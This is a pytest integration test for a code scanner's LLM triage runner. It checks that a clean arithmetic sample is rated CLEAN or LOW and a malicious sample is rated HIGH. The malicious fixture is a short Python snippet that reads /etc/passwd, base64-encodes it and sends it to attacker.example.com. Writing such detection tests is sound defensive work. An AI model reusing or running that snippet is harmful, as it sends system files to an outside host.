"""SCAN-001 integration smoke: make_gemini_triage_runner against two
samples — one obviously clean, one obviously malicious.

Verifies the live triage path end-to-end:
  bytes → Gemini Flash-Lite (TRIAGE_PROMPT, no thinking) → engine-shape
  triage dict.

Cost ≈ $0.001 total (Flash-Lite is the cheapest tier).

Run:
    uv run pytest tests/integration/test_runners_triage_smoke.py -v -s
"""

from __future__ import annotations

import os

import pytest
from dotenv import load_dotenv

from scanner.runners import make_gemini_triage_runner

load_dotenv(override=True)


CLEAN_SAMPLE = b"""
def add(a: int, b: int) -> int:
    return a + b


def multiply(a: int, b: int) -> int:
    return a * b
"""


MALICIOUS_SAMPLE = b"""
import base64
import urllib.request

data = open("/etc/passwd").read()
encoded = base64.b64encode(data.encode()).decode()
urllib.request.urlopen(f"http://attacker.example.com/exfil?p={encoded}")
"""


@pytest.mark.integration
@pytest.mark.asyncio
async def test_triage_runner_classifies_clean_sample() -> None:
    api_key = os.environ.get("GEMINI_API_KEY")
    if not api_key:
        pytest.skip("GEMINI_API_KEY not set")

    runner = make_gemini_triage_runner(api_key)
    out = await runner("math.py", CLEAN_SAMPLE, None)

    print(
        f"\n  [clean] classification={out['classification']} "
        f"reason={out['reason'][:60]!r} "
        f"tokens in/out={out['input_tokens']}/{out['output_tokens']} "
        f"cost=${out['cost_usd']:.6f} "
        f"time={out['duration_ms']}ms"
    )

    assert out["error"] is None
    assert out["model"] == "gemini-3.1-flash-lite-preview"
    assert out["classification"] in ("CLEAN", "LOW"), (
        f"pure arithmetic should triage CLEAN/LOW, got {out['classification']}"
    )
    assert out["input_tokens"] > 0
    assert out["output_tokens"] > 0


@pytest.mark.integration
@pytest.mark.asyncio
async def test_triage_runner_classifies_malicious_sample() -> None:
    api_key = os.environ.get("GEMINI_API_KEY")
    if not api_key:
        pytest.skip("GEMINI_API_KEY not set")

    runner = make_gemini_triage_runner(api_key)
    out = await runner("exfil.py", MALICIOUS_SAMPLE, None)

    print(
        f"\n  [malicious] classification={out['classification']} "
        f"reason={out['reason'][:60]!r} "
        f"tokens in/out={out['input_tokens']}/{out['output_tokens']} "
        f"cost=${out['cost_usd']:.6f} "
        f"time={out['duration_ms']}ms"
    )

    assert out["error"] is None
    assert out["classification"] == "HIGH", f"obvious /etc/passwd exfil should triage HIGH, got {out['classification']}"
